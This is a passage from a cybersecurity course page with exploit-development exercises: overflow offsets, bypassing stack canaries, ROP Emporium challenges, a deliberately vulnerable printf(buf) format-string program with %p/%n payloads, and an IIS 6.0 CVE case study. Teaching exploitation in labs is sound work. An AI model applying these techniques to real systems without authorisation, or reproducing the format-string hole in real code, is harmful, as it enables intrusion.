+<p>Change the buffer size from 64 to 128. What's the new offset?</p>
+<h3 id="ex-14b3-with-canary">Ex 14b.3 — With canary</h3>
+<p>Recompile with <code>-fstack-protector-all</code>. Modify the payload. Without modifying the program, run it. What happens at the ret?</p>
+<p>Answer: the canary gets overwritten → <code>__stack_chk_fail</code> → abort. To bypass it you first need to leak the canary (info leak).</p>
+<h3 id="ex-14b4-rop-emporium">Ex 14b.4 — ROP Emporium</h3>
+<p>Go to <a href="https://ropemporium.com">ropemporium.com</a>. Complete "ret2win", "split", "callme", "write4". They are guided and progressive.</p>
+<h3 id="ex-14b5-format-string">Ex 14b.5 — Format string</h3>
+<p>Compile:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int secret = 0xdeadbeef;
+int main() {
+    char buf[100];
+    fgets(buf, 100, stdin);
+    printf(buf);
+    return 0;
+}
+</code></pre>
+<p>With <code>gcc -fno-stack-protector -no-pie</code>. Input <code>%p %p %p %p %p</code>. You see stack addresses. Leak it, then use <code>%n</code> to write.</p>
+<h3 id="ex-14b6-cve-case-study">Ex 14b.6 — CVE case study</h3>
+<p>Study <a href="https://www.exploit-db.com/exploits/41738">CVE-2017-7269</a> (IIS 6.0 ScStoragePathFromUrl) — a classic example of stack-based BoF in production. Understand the chain.</p>
+<h2 id="key-concepts">Key concepts</h2>
+<ol>
+<li><strong>Stack-based BoF</strong> is 50 years old and still one of the most common.</li>
+<li><strong>Offset</strong> = buf size + saved RBP (usually).</li>
+<li><strong>Without protections</strong> → trivial ret2win.</li>
+<li><strong>NX on</strong> → ROP.</li>
+<li><strong>ASLR on</strong> → info-leak required first.</li>
+<li><strong>Canary on</strong> → leak the canary or frameless overflow required.</li>
+<li><strong>Modern full mitigations + CET</strong> → exploit requires 2-3 separate bugs and creativity.</li>
+</ol>
+<p>Now "stack overflow" is no longer a word — it's your own experience, reproducible, debugged.</p>
+      <nav class="pager">
+<a href="14-exploit-development.html" class="prev"><span class="label">← Previous</span><span class="title">Exploit development: from buffer overflow to ROP</span></a>
+<a href="15-reverse-engineering.html" class="next"><span class="label">Next →</span><span class="title">Reverse engineering</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — built as a continuous path. Static build from Markdown.</p><p>Educational material. Everything you learn here is to be used only on systems you own, in labs, in authorized bug-bounty programs, or under signed pentest contracts. <strong>Don't break the law.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
+<script src="../search-data.js"></script>
+<script src="../../search.js"></script>
+<script src="../../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
